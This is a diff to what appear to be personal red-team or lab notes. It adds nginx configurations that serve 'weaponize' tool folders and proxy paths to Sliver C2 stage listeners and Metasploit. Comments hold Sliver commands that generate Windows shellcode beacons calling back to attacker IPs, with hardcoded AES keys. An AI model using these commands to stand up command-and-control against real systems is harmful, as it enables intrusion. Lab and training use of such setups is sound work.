@@ -28,6 +28,206 @@
         `uploadserver -b 127.0.0.1 8884 --directory $(pwd)/utils`
 ## Nginx reverse proxy
 better solution for box because allow multiple directory to be mapped on the same site (did not check how to do it on apache) 
+```bash
+$ cat /etc/nginx/nginx.conf
+user http;
+worker_processes  1;
+#error_log  logs/error.log;
+#error_log  logs/error.log  notice;
+#error_log  logs/error.log  info;
+#pid        logs/nginx.pid;
+# Load all installed modules
+include modules.d/*.conf;
+events {
+    worker_connections  1024;
+}
+http {
+    include       mime.types;
+    default_type  application/octet-stream;
+    #log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
+    #                  '$status $body_bytes_sent "$http_referer" '
+    #                  '"$http_user_agent" "$http_x_forwarded_for"';
+    #access_log  logs/access.log  main;
+    sendfile        on;
+    #tcp_nopush     on;
+    #keepalive_timeout  0;
+    keepalive_timeout  65;
+    #gzip  on;
+   #include /etc/nginx/conf.d/*.conf;
+   include /etc/nginx/conf.d/http.conf;
+}
+```
+
+```bash
+$ cat /etc/nginx/conf.d/http.conf
+
+server {
+    listen       8880;
+    server_name  localhost;
+
+    #access_log  logs/host.access.log  main;
+    #error_page  404              /404.html;
+    # redirect server error pages to the static page /50x.html
+    #
+    error_page   500 502 503 504  /50x.html;
+    location = /50x.html {
+        root   html;
+    }
+    location / {
+        root   html;
+        index  index.html index.htm;
+    }
+    location /sharp/ {
+        alias   /opt/windows/SharpCollection/NetFramework_4.7_x64/;
+        autoindex on;
+    }
+    location /win/ {
+        alias   /opt/windows/windows_weaponize/;
+        autoindex on;
+    }
+    location /lin/ {
+        alias   /opt/linux/linux_weaponize/;
+        autoindex on;
+    }
+    location /obf/ {
+        proxy_pass http://127.0.0.1:8881/;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+    }
+    location /lab/ {
+        proxy_pass  http://127.0.0.1:8884/;
+    }
+    # http -L 127.0.0.1 -l 8890 --persistent
+    location /sliver/ {
+        proxy_pass  http://127.0.0.1:8890/;
+    }
+#    # https --lhost 127.0.0.1 --lport 8891 --persistent --cert /home/jubeaz/sliver.crt --key /home/jubeaz/sliver.key
+#    location /sliver_ssl/ {
+#        proxy_pass  http://127.0.0.1:8891/;
+#    }
+    # profiles new beacon --seconds 30 --jitter 3 --os windows --arch amd64 --format shellcode --skip-symbols --http  http://192.168.10.21:80/sliver/pwn jubeaz
+    # stage-listener --url http://127.0.0.1:8870 --profile jubeaz  --prepend-size --aes-encrypt-key D(H+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 9y/B?E(G+KbPeShV -C zlib
+    location /sl_debug/ {
+        proxy_pass  http://127.0.0.1:8870/;
+    }
+    # profiles new beacon --seconds 30 --jitter 3 --os windows --arch amd64 --format shellcode --skip-symbols --http  https://192.168.10.21:443/sliver/pwn jubeaz_https
+    # stage-listener --url http://127.0.0.1:8871 --profile jubeaz_https  --prepend-size --aes-encrypt-key D(H+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 9y/B?E(G+KbPeShV -C zlib    
+    location /sl_debug_ssl/ {
+        proxy_pass  http://127.0.0.1:8871/;
+    }
+    # profiles new beacon --seconds 30 --jitter 3 --os windows --arch amd64 --format shellcode --skip-symbols --http  http://10.10.14.17:80/sliver/pwn cybernetics
+    # stage-listener --url http://127.0.0.1:8872 --profile cybernetics  --prepend-size --aes-encrypt-key D(H+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 9y/B?E(G+KbPeShV -C zlib
+    location /sl_prod/ {
+        proxy_pass  http://127.0.0.1:8872/;
+    }
+    # profiles new beacon --seconds 30 --jitter 3 --os windows --arch amd64 --format shellcode --skip-symbols --http  https://10.10.14.17:443/sliver/pwn cybernetics_https
+    # stage-listener --url http://127.0.0.1:8873 --profile cybernetics_https  --prepend-size --aes-encrypt-key D(H+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 9y/B?E(G+KbPeShV -C zlib 
+    location /sl_prod_ssl/ {
+        proxy_pass  http://127.0.0.1:8873/;
+    }
+    location ~ ^/msf(.*) {
+ 	proxy_pass http://127.0.0.1:4445;
+    }
+}
+```
+
+```bash
+$ cat /etc/nginx/conf.d/https.conf
+
+server {
+    listen       443 ssl;
+#        server_name  localhost;
+
+    ssl_certificate      /etc/nginx/ssl/redteam.crt;
+    ssl_certificate_key  /etc/nginx/ssl/redteam.key;
+
+    ssl_session_cache    shared:SSL:1m;
+    ssl_session_timeout  5m;
+
+    ssl_ciphers  HIGH:!aNULL:!MD5;
+    ssl_prefer_server_ciphers  on;
+
+    location / {
+        root   html;
+        index  index.html index.htm;
+        autoindex on;
+    }
+    location /sharp/ {
+        alias   /opt/windows/SharpCollection/NetFramework_4.7_x64/;
+        autoindex on;
+    }
+    location /win/ {
+        alias   /opt/windows/windows_weaponize/;
+        autoindex on;
+    }
+    location /lin/ {
+        alias   /opt/linux/linux_weaponize/;
+        autoindex on;
+    }
+    location /obf/ {
+        proxy_pass http://127.0.0.1:8881/;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+    }
+    location /lab/ {
+        proxy_pass  http://127.0.0.1:8884/;
+    }
+    # http --lhost 0.0.0.0 --lport 8890 --persistent
+    location /sliver/ {
+        proxy_pass  http://127.0.0.1:8890/;
+#        proxy_pass  https://127.0.0.1:8891/;
+#        # HTTP headers standards
+#        proxy_set_header Host $host;
+#        proxy_set_header X-Real-IP $remote_addr;
+#        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+#        proxy_set_header X-Forwarded-Proto https;
+#
+#        # HTTPS backend options
+#        proxy_ssl_server_name on;
+#        proxy_ssl_verify off; 
+#
+#        proxy_http_version 1.1;
+#        proxy_set_header Upgrade $http_upgrade;
+#        proxy_set_header Connection "upgrade";
+    }
+#    # https --lhost 0.0.0.0 --lport 8891 --persistent --cert /home/jubeaz/sliver.crt --key /home/jubeaz/sliver.key
+#    location /sliver_ssl/ {
+#        # sliver does not like proxy ?
+#        proxy_pass  http://127.0.0.1:8891/;
+#    }
+    # profiles new beacon --seconds 30 --jitter 3 --os windows --arch amd64 --format shellcode --skip-symbols --http  http://192.168.10.21:80/sliver/pwn jubeaz
+    # stage-listener --url http://127.0.0.1:8870 --profile jubeaz  --prepend-size --aes-encrypt-key D(H+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 9y/B?E(G+KbPeShV -C zlib
+    location /sl_debug/ {
+        proxy_pass  http://127.0.0.1:8870/;
+    }
+    # profiles new beacon --seconds 30 --jitter 3 --os windows --arch amd64 --format shellcode --skip-symbols --http  https://192.168.10.21:443/sliver/pwn jubeaz_https
+    # stage-listener --url http://127.0.0.1:8871 --profile jubeaz_https  --prepend-size --aes-encrypt-key D(H+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 9y/B?E(G+KbPeShV -C zlib    
+    location /sl_debug_ssl/ {
+        proxy_pass  http://127.0.0.1:8871/;
+    }
+    # profiles new beacon --seconds 30 --jitter 3 --os windows --arch amd64 --format shellcode --skip-symbols --http  http://10.10.14.17:80/sliver/pwn cybernetics
+    # stage-listener --url http://127.0.0.1:8872 --profile cybernetics  --prepend-size --aes-encrypt-key D(H+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 9y/B?E(G+KbPeShV -C zlib
+    location /sl_prod/ {
+        proxy_pass  http://127.0.0.1:8872/;
+    }
+    # profiles new beacon --seconds 30 --jitter 3 --os windows --arch amd64 --format shellcode --skip-symbols --http  https://10.10.14.17:443/sliver/pwn cybernetics_https
+    # stage-listener --url http://127.0.0.1:8873 --profile cybernetics_https  --prepend-size --aes-encrypt-key D(H+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 9y/B?E(G+KbPeShV -C zlib 
+    location /sl_prod_ssl/ {
+        proxy_pass  http://127.0.0.1:8873/;
+    }
+
+#    location /ligolo {
+#            proxy_set_header Host $host;
+#            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+#            proxy_set_header Upgrade websocket;
+#            proxy_set_header Connection Upgrade;
+#            proxy_http_version 1.1;
+#            proxy_pass https://127.0.0.1:11602;
+#    }
+}
+```
+
+
 ## Apache reverse proxy
 
 use `.htaccess` instead of config. In order to use `.htaccess` files, we
